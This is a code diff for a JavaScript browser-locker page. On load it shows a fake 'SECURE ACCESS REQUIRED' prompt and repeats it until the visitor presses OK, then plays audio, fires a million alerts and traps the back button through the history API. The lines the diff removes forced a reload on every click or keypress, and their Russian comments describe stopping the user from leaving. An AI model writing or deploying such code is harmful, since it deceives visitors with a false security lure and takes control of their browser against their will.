@@ -65,35 +65,22 @@
     setTimeout(() => alertSpam(count-1), 1);
   }
 
-  function promptAndSpam(){
-    const promptText = randomText(PROMPT_LEN);
-    let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + promptText + "\n\nPress OK to continue");
-    if(res !== null){
-      tryPlayAudio();
-      alertSpam(1000000);
-    } else {
-      // если отмена — снова prompt
-      setTimeout(promptAndSpam, 0);
+  async function startProcess(){
+    while(true){
+      const promptText = randomText(PROMPT_LEN);
+      let res = prompt("SECURE ACCESS REQUIRED\n\nHASH:\n" + promptText + "\n\nPress OK to continue");
+      if(res !== null){
+        await tryPlayAudio();
+        alertSpam(1000000);
+        break;
+      }
     }
   }
 
   window.onload = () => {
-    promptAndSpam();
+    startProcess();
   };
 
-  // Перезагружаем страницу при любом действии, чтобы сработать по 100%
-  const reloadEvents = ['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'];
-  reloadEvents.forEach(ev=>{
-    window.addEventListener(ev, e => {
-      try {
-        location.reload();
-      } catch {
-        location.href = location.href;
-      }
-    }, {capture:true, passive:false});
-  });
-
-  // Запрет выхода со страницы
   history.pushState(null, document.title, location.href);
   window.addEventListener('popstate', ()=>history.pushState(null, document.title, location.href));
 
